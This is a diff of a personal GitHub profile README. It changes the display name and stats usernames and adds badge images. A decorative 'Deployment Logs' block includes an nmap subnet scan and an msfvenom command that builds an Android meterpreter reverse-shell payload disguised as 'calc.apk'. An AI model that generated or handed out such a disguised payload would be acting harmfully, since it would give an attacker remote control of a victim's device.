@@ -1,5 +1,5 @@
 <p align="center">
-  <img src="https://capsule-render.vercel.app/api?type=soft&color=0D1117&height=200&section=header&text=PROQRAMER&fontSize=80&animation=fadeIn&fontColor=36BCF7" />
+  <img src="https://capsule-render.vercel.app/api?type=soft&color=0D1117&height=200&section=header&text=HIDASE%20BERHE&fontSize=80&animation=fadeIn&fontColor=36BCF7" />
 </p>
 
 <p align="center">
@@ -9,6 +9,7 @@
 ---
 
 ### 📟 [TERMINAL_STATUS]: ENCRYPTED
+> **Identity:** Hidase Berhe // **Handle:** @proqramer
 > **Bio:** Full-Stack Web Developer and Red Team Enthusiast. 
 > I specialize in building secure web architectures and testing mobile/network vulnerabilities. Currently engineering **Ghost-Net**, a virtualized environment for digital anonymity.
 
@@ -44,12 +45,34 @@
 
 ## 📊 Neural Metrics:
 <p align="center">
-  <img src="https://github-readme-stats.vercel.app/api?username=proqramer&theme=tokyonight&hide_border=false&include_all_commits=true&count_private=true&show_icons=true" /><br/>
-  <img src="https://nirzak-streak-stats.vercel.app/?user=proqramer&theme=tokyonight&hide_border=false" /><br/>
-  <img src="https://github-readme-stats.vercel.app/api/top-langs/?username=proqramer&theme=tokyonight&hide_border=false&include_all_commits=true&count_private=true&layout=compact" />
+  <img src="https://github-readme-stats.vercel.app/api?username=hidu8989&theme=tokyonight&hide_border=false&include_all_commits=true&count_private=true&show_icons=true" /><br/>
+  <img src="https://nirzak-streak-stats.vercel.app/?user=hidu8989&theme=tokyonight&hide_border=false" /><br/>
+  <img src="https://github-readme-stats.vercel.app/api/top-langs/?username=hidu8989&theme=tokyonight&hide_border=false&include_all_commits=true&count_private=true&layout=compact" />
 </p>
 
 ### 📜 Deployment Logs
 ```bash
-$sudo nmap -sV 192.168.1.0/24$ msfvenom -p android/meterpreter/reverse_tcp LHOST=eth0 LPORT=4444 -o calc.apk
-$kalitorify --start$ systemctl status ghost-net.service [RUNNING]
+$ sudo nmap -sV 192.168.1.0/24
+$ msfvenom -p android/meterpreter/reverse_tcp LHOST=eth0 LPORT=4444 -o calc.apk
+$ kalitorify --start
+$ systemctl status ghost-net.service [RUNNING]
+```
+
+---
+
+### 🔝 Top Contributed Repositories
+<p align="center">
+  <img src="https://github-contributor-stats.vercel.app/api?username=hidu8989&limit=5&theme=tokyonight&combine_all_yearly_contributions=true" />
+</p>
+
+<p align="center">
+  <img src="https://quotes-github-readme.vercel.app/api?type=horizontal&theme=tokyonight" />
+</p>
+
+<p align="right">
+  <img src="https://visitcount.itsvg.in/api?id=hidu8989&icon=0&color=36BCF7" />
+</p>
+
+<p align="center">
+  <img src="https://capsule-render.vercel.app/api?type=waving&color=36BCF7&height=100&section=footer" />
+</p>
